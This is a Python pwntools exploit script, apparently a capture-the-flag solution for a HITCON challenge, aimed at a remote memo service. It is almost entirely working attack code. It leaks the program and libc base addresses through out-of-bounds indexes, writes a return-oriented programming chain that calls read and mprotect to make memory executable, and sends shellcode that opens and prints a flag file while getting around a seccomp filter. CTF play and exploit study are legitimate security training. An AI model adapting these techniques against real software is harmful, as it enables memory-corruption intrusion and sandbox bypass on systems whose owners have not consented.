#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('52.192.178.153', 31337)
libc = ELF('libc.so.6')
context.arch = 'amd64'

def show(index):
    r.sendlineafter('Choice?\n', '1')
    r.sendlineafter('Idx?\n', str(index))

def memo(index, num):
    r.sendlineafter('Choice?\n', '2')
    r.sendlineafter('Idx?\n', str(index))
    r.sendlineafter('Give me your number:\n', str(num))

def leave():
    r.sendlineafter('Choice?\n', '3')

# leak code base
show(0xca)
r.recvuntil('Here it is: ')
code_base = (int(r.recvline()[:-1]) & 0xffffffffffffffff) - 0xbb0
log.success('code base: ' + hex(code_base))
bss = code_base + 0x202000

# leak libc address
show(0xcb)
r.recvuntil('Here it is: ')
libc_base = (int(r.recvline()[:-1]) & 0xffffffffffffffff) - 0x203f1
log.success('libc base: ' + hex(libc_base))

pop_rdi_ret = libc_base + 0x1fd7a
pop_rsi_ret = libc_base + 0x1fcbd
pop_rdx_ret = libc_base + 0x1b92
mprotect = libc_base + libc.symbols['mprotect']
read = libc_base + libc.symbols['read']

# open, read and write /home/artifact/flag
# let third argument of open be 2 is to satisfy the seccomp check: sys_number == args[2]
shellcode = asm("""
    mov r8, 0x000000000067616c
    push r8
    mov r8, 0x662f746361666974
    push r8
    mov r8, 0x72612f656d6f682f
    push r8
    mov rdi, rsp
    xor rsi, rsi
    mov rdx, 0x2
    mov rax, 0x2
    syscall

    mov rdi, rax
    mov rsi, {}
    mov rdx, 0x60
    xor rax, rax
    syscall

    mov rdx, rax
    mov rdi, 1
    mov rsi, {}
    mov rax, 1
    syscall
""".format(bss+0xf00, bss+0xf00))

memo(0xcb, pop_rdi_ret)
memo(0xcc, 0x0)
memo(0xcd, pop_rsi_ret)
memo(0xce, bss+0xc00)
memo(0xcf, pop_rdx_ret)
memo(0xd0, 0x200)
memo(0xd1, read)

memo(0xd2, pop_rdi_ret)
memo(0xd3, bss)
memo(0xd4, pop_rsi_ret)
memo(0xd5, 0xe00)
memo(0xd6, pop_rdx_ret)
memo(0xd7, 0x6) # 0x6 & 0x1 != 1
memo(0xd8, mprotect)

memo(0xd9, bss+0xc00)
leave() # trigger return to shellcode

r.send(shellcode)

r.interactive()

# hitcon{why_libseccomp_cheated_me_Q_Q}
